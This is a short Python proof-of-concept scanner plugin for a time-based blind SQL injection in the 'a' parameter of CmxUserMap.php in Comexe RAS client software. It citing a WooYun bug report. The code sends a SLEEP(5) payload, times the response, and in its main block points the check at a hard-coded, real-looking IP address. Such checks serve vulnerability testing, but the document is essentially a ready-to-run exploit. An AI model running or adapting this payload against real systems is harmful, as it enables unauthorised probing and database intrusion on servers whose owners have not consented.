#!/usr/bin/env python
# -*- coding: utf-8 -*-
#POC Name  : 科迈RAS标准版客户端CmxUserMap.php页面a参数注入
#Author    : 这个程序员不太冷
#Referer   : http://www.wooyun.org/bugs/wooyun-2014-065966/
import time

def assign(service, arg):
     if service == "comexe_ras":
        return True, arg


def audit(arg):
    payload = 'Server/CmxUserMap.php?t=&a=123&b=32&c=undefined&d='
    target = arg + payload
    fst_sta=time.time()
    code, head, res, errcode, _ = curl.curl2(target)
    fst_end=time.time()

    
    payload = "Server/CmxUserMap.php?t=&a=123%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))JarV)%20AND%20%27aSBL%27=%27aSBL&b=32&c=undefined&d="
    target=arg+payload
    sec_sta=time.time()
    code1, head1, res1, errcode1, _ = curl.curl2(target)
    sec_end=time.time()

    fst=fst_end-fst_sta
    sec=sec_end-sec_sta

    
    if code==code1 and fst<2 and sec>5:
        security_hole(target)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('comexe_ras','http://223.255.9.145:8083/')[1])
